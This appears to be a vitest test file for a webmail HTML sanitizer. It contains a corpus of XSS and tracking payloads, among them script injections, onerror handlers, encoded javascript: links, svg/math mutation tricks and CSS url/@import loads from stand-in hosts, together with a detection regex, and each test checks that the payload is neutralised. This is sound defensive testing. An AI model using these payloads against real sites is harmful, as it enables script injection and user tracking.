// SPDX-License-Identifier: AGPL-3.0-only
import { describe, expect, it } from "vitest";

import { cleanCss, MAX_STYLE_ATTR, MAX_STYLE_BLOCK, sanitizeMessageHtml } from "./sanitize";

const clean = (html: string) => sanitizeMessageHtml(html).html;

/** Anything that could run script, load remote content or escape the frame. */
const DANGER =
  /<script|<iframe|<object|<embed|<svg|<math|<form|<input|<button|<base|<meta|<link|on[a-z]+\s*=|javascript:|vbscript:|expression\(|@import|url\(\s*['"]?https?:|srcset|formaction|xlink:href|<template|<noscript/i;

/** Initial XSS / privacy corpus (docs/internal/05-webmail.md "Rendering safety"). Grows with every finding. */
const CORPUS: [name: string, html: string][] = [
  ["script tag", `<p>hi</p><script>alert(1)</script>`],
  ["script with src", `<script src="https://evil.example/x.js"></script>`],
  ["uppercase script", `<SCRIPT>alert(1)</SCRIPT>`],
  ["nested script", `<scr<script>ipt>alert(1)</script>`],
  ["img onerror", `<img src=x onerror="alert(1)">`],
  ["body onload", `<body onload="alert(1)"><p>x</p></body>`],
  ["svg onload", `<svg onload="alert(1)"><circle r="1"/></svg>`],
  ["svg script", `<svg><script>alert(1)</script></svg>`],
  ["svg animate href", `<svg><a><animate attributeName="href" to="javascript:alert(1)"/><text>x</text></a></svg>`],
  ["math", `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`],
  ["javascript href", `<a href="javascript:alert(1)">x</a>`],
  ["javascript href entity", `<a href="jav&#x61;script:alert(1)">x</a>`],
  ["javascript href whitespace", `<a href=" javascript:alert(1)">x</a>`],
  ["vbscript href", `<a href="vbscript:msgbox(1)">x</a>`],
  ["data html href", `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`],
  ["iframe", `<iframe src="https://evil.example"></iframe>`],
  ["iframe srcdoc", `<iframe srcdoc="<script>alert(1)</script>"></iframe>`],
  ["object", `<object data="https://evil.example/x.swf"></object>`],
  ["embed", `<embed src="https://evil.example/x">`],
  ["form", `<form action="https://evil.example"><input name="password"><button>Go</button></form>`],
  ["button formaction", `<button formaction="javascript:alert(1)">x</button>`],
  ["meta refresh", `<meta http-equiv="refresh" content="0;url=https://evil.example">`],
  ["base tag", `<base href="https://evil.example/"><a href="/x">x</a>`],
  ["link stylesheet", `<link rel="stylesheet" href="https://evil.example/x.css">`],
  ["css expression", `<div style="width: expression(alert(1))">x</div>`],
  ["css url remote", `<div style="background:url(https://track.example/p.gif)">x</div>`],
  ["css url escaped", `<div style="background:\\75 rl(https://track.example/p.gif)">x</div>`],
  ["css url comment split", `<div style="background:ur/**/l(https://track.example/p.gif)">x</div>`],
  ["css image-set", `<div style="background-image:image-set('https://track.example/a.png' 1x)">x</div>`],
  ["css behavior", `<div style="behavior:url(x.htc)">x</div>`],
  ["css moz binding", `<div style="-moz-binding:url(https://evil.example/x.xml#x)">x</div>`],
  ["style import", `<style>@import url("https://evil.example/x.css"); p{color:red}</style>`],
  ["style import string", `<style>@import "https://evil.example/x.css";</style>`],
  ["style url", `<style>body{background:url('https://track.example/b.png')}</style>`],
  ["style with attributes", `<style id="x" media="all">body{background:url(https://t.example/a.png)}</style>`],
  ["style with type", `<style type="text/css">@import url(https://evil.example/x.css);</style>`],
  ["style breakout", `<style></style><script>alert(1)</script></style>`],
  ["style markup inside", `<style><img src=x onerror=alert(1)></style>`],
  ["remote img", `<img src="https://images.example/a.png" width="300" height="100">`],
  ["protocol-relative img", `<img src="//images.example/a.png">`],
  ["srcset", `<img src="data:image/png;base64,iVBORw0KGgo=" srcset="https://images.example/a@2x.png 2x">`],
  ["picture source", `<picture><source srcset="https://images.example/a.webp"><img src="x.png"></picture>`],
  ["video poster", `<video poster="https://images.example/p.jpg"></video>`],
  ["table background", `<table background="https://images.example/bg.png"><tr><td>x</td></tr></table>`],
  ["svg data image", `<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">`],
  ["template", `<template><script>alert(1)</script></template>`],
  ["noscript", `<noscript><img src=x onerror=alert(1)></noscript>`],
  ["textarea breakout", `<textarea></textarea><img src=x onerror=alert(1)></textarea>`],
  ["xlink", `<a xlink:href="javascript:alert(1)">x</a>`],
  ["event on allowed tag", `<p onclick="alert(1)" onmouseover="alert(2)">x</p>`],
  ["unclosed iframe", `<iframe><img src=x onerror=alert(1)>`],
  ["comment trick", `<!--<img src="--><img src=x onerror=alert(1)//">`],
];

describe("sanitizeMessageHtml — XSS and privacy corpus", () => {
  it.each(CORPUS)("%s", (_name, html) => {
    const out = clean(html);
    // <style> contents are raw text (never markup) and can't contain "<"; check them separately.
    const styles = [...out.matchAll(/<style>([\s\S]*?)<\/style>/g)].map((m) => m[1] ?? "");
    for (const css of styles) expect(css).not.toMatch(/<|url\(\s*['"]?https?:|@import|expression\(/i);
    expect(out.replace(/<style>[\s\S]*?<\/style>/g, "<style></style>")).not.toMatch(DANGER);
    // No element may keep a remote image source.
    expect(out).not.toMatch(/\ssrc="(?:https?:)?\/\//i);
  });
});

describe("sanitizeMessageHtml — what survives", () => {
  it("keeps presentational markup, tables and safe styles", () => {
    const out = clean(
      `<table cellpadding="4" border="1"><tr><td align="left" style="color: #333; padding: 4px">Cell</td></tr></table><p><strong>Bold</strong> <em>it</em></p>`,
    );
    expect(out).toContain('<table cellpadding="4" border="1">');
    expect(out).toContain('style="color: #333; padding: 4px"');
    expect(out).toContain("<strong>Bold</strong>");
  });

  it("opens links in a new tab without a referrer, keeping http(s) and mailto", () => {
    const out = clean(`<a href="https://example.org/x">a</a><a href="mailto:a@example.org">b</a>`);
    expect(out).toContain('<a href="https://example.org/x" target="_blank" rel="noopener noreferrer">a</a>');
    expect(out).toContain('href="mailto:a@example.org"');
  });

  it("blocks remote images as placeholders, drops 1×1 trackers and counts both", () => {
    const r = sanitizeMessageHtml(
      `<img src="https://a.example/hero.jpg" width="600" height="200" alt="Hero"><img src="https://t.example/o.gif" width="1" height="1"><div style="background:url(https://a.example/bg.png)">x</div>`,
    );
    expect(r.html).toContain('<img width="600" height="200" alt="Hero" data-am-blocked="1" />');
    expect(r.html).not.toContain("t.example");
    expect(r.blockedImages).toBe(2);
    expect(r.blockedTrackers).toBe(1);
  });

  it("keeps raster data: images and resolves cid: parts the caller inlined", () => {
    const png = "data:image/png;base64,iVBORw0KGgo=";
    const r = sanitizeMessageHtml(
      `<img src="${png}" alt="a"><img src="cid:logo@x" alt="b"><img src="cid:missing" alt="c">`,
      new Map([["logo@x", png]]),
    );
    expect(r.html.match(/src="data:image\/png/g)).toHaveLength(2);
    expect(r.html).toContain('alt="c" data-am-blocked="1"');
    expect(r.blockedImages).toBe(1);
  });

  it("keeps <style> rules after scrubbing them", () => {
    const out = clean(
      `<html><head><title>T</title><style>.a{color:red;background:url(https://x.example/b.png)} /* c */</style></head><body><p class="a">x</p></body></html>`,
    );
    expect(out).toContain("<style>.a{color:red;background:none} </style>");
    expect(out).not.toContain(">T<");
    expect(out).toContain('<p class="a">x</p>');
  });

  it("returns plain text content escaped", () => {
    expect(clean("a < b & c")).toBe("a &lt; b &amp; c");
  });
});

describe("cleanCss", () => {
  it("neutralises every remote load and script-ish construct, and counts remote references", () => {
    const counter = { remote: 0 };
    const out = cleanCss(
      `@import 'x.css'; a{background:url("https://x.example/a.png")} b{background:url(data:image/png;base64,AAAA)} c{width:expression(1)} d{behavior:url(x)} e{x:javascript:1} f{background:url(https://y.example/unbalanced} g{background:-webkit-image-set("https://z.example/a.png" 1x)}`,
      counter,
    );
    expect(out).not.toMatch(/https?:|expression\(|@import|behavior|javascript:/i);
    expect(out).toContain('url("data:image/png;base64,AAAA")');
    expect(counter.remote).toBeGreaterThanOrEqual(4);
  });
});

describe("sanitiser limits and adversarial input", () => {
  const time = (fn: () => void) => {
    const t = performance.now();
    fn();
    return performance.now() - t;
  };

  it("scrubs a megabyte of unterminated url( in linear time", () => {
    const ms = time(() => {
      expect(cleanCss("url(".repeat(250_000))).not.toMatch(/url\(/i);
    });
    expect(ms).toBeLessThan(100);
  });

  it("stays linear on other url( shapes: quoted, quote then far paren, nested", () => {
    for (const evil of [
      'url("'.repeat(200_000),
      `${'url("a"x'.repeat(100_000)})`,
      `${"url(url(".repeat(120_000)}))`,
      `${"url('".repeat(100_000)}'`,
      "@import".repeat(140_000),
      "/*".repeat(500_000),
    ]) {
      const ms = time(() => {
        expect(cleanCss(evil)).not.toMatch(/url\(\s*['"]?https?:|@import/i);
      });
      expect(ms).toBeLessThan(100);
    }
  });

  it("handles a megabyte of hostile HTML quickly", () => {
    const attr = `<p style="${"url(".repeat(1_800)}">x</p>`; // just under the attribute cap
    const html = attr.repeat(Math.ceil(1_000_000 / attr.length));
    const ms = time(() => {
      sanitizeMessageHtml(html);
    });
    expect(ms).toBeLessThan(2_000);
  });

  it("drops over-long style attributes and blocks, counting them as blocked", () => {
    const big = `<p style="color:red;${"a".repeat(MAX_STYLE_ATTR)}">x</p>`;
    const r1 = sanitizeMessageHtml(big);
    expect(r1.html).toBe("<p>x</p>");
    expect(r1.blockedImages).toBe(1);
    const r2 = sanitizeMessageHtml(`<style>${"p{color:red}".repeat(MAX_STYLE_BLOCK / 10)}</style><p>x</p>`);
    expect(r2.html).toBe("<style></style><p>x</p>");
    expect(r2.blockedImages).toBe(1);
  });

  it("keeps a safe data: image in CSS and neutralises a malformed quoted url", () => {
    expect(cleanCss('a{background:url( "data:image/png;base64,AAAA" )}')).toBe(
      'a{background:url("data:image/png;base64,AAAA")}',
    );
    const c = { remote: 0 };
    expect(cleanCss('a{background:url("https://x.example/a.png" junk)}', c)).not.toContain("https:");
    expect(c.remote).toBeGreaterThan(0);
  });

  it("strips every attribute from <style>", () => {
    expect(sanitizeMessageHtml(`<style id="x" class="y">p{color:red}</style>`).html).toBe(
      "<style>p{color:red}</style>",
    );
  });
});

describe("quoted replies and signatures in HTML mail", () => {
  it("turns quote containers into a collapsed details toggle and dims signatures", () => {
    const out = sanitizeMessageHtml(
      '<p>Reply</p><div class="gmail_quote"><div>On Mon, Sam wrote:</div><blockquote type="cite">old</blockquote></div><div class="gmail_signature">Sam</div><blockquote>plain quote stays</blockquote>',
    ).html;
    expect(out).toContain(
      '<details class="gmail_quote" data-am-quote="1"><summary title="Show quoted text" aria-label="Show quoted text">&#8226;&#8226;&#8226;</summary>',
    );
    // The cited blockquote inside it collapses too.
    expect(out.match(/data-am-quote="1"/g)).toHaveLength(2);
    expect(out).toContain('<div class="gmail_signature" data-am-sig="1">Sam</div>');
    expect(out).toContain("<blockquote>plain quote stays</blockquote>");
    expect(out).toMatch(/old<\/details><\/details>/);
  });

  it("ignores look-alike marker attributes sent by the message", () => {
    const out = sanitizeMessageHtml('<details data-am-quote="1"><p>x</p></details><p data-am-sig="1">y</p>').html;
    expect(out).not.toContain("data-am-quote");
    expect(out).not.toContain("data-am-sig");
    expect(out).not.toContain("<summary");
  });

  it("recognises a reply header block (border-top divider)", () => {
    expect(sanitizeMessageHtml('<div id="divRplyFwdMsg">From: x</div>').html).toContain('data-am-quote="1"');
  });
});

describe("image links for the image proxy", () => {
  it("adds a link only when the caller signs, and never keeps a forged one", () => {
    const plain = sanitizeMessageHtml('<img src="https://cdn.example.org/a.png" data-am-img="v1.1.forged.mac">');
    expect(plain.html).not.toContain("data-am-img");
    expect(plain.loadableImages).toBe(0);
    const signed = sanitizeMessageHtml(
      '<img src="https://cdn.example.org/a.png" data-am-img="v1.1.forged.mac"><img src="cid:gone">',
      new Map(),
      { imageLink: () => "v1.9.real.mac" },
    );
    expect(signed.html).toContain('data-am-img="v1.9.real.mac"');
    expect(signed.html).not.toContain("forged");
    expect(signed.loadableImages).toBe(1);
    expect(signed.blockedImages).toBe(2);
  });

  it("leaves an image blocked when the signer refuses it or returns something unsafe", () => {
    const refused = sanitizeMessageHtml('<img src="https://cdn.example.org:8443/a.png">', new Map(), {
      imageLink: () => null,
    });
    expect(refused.loadableImages).toBe(0);
    const odd = sanitizeMessageHtml('<img src="https://cdn.example.org/a.png">', new Map(), {
      imageLink: () => '"><script>',
    });
    expect(odd.html).not.toContain("data-am-img");
  });
});
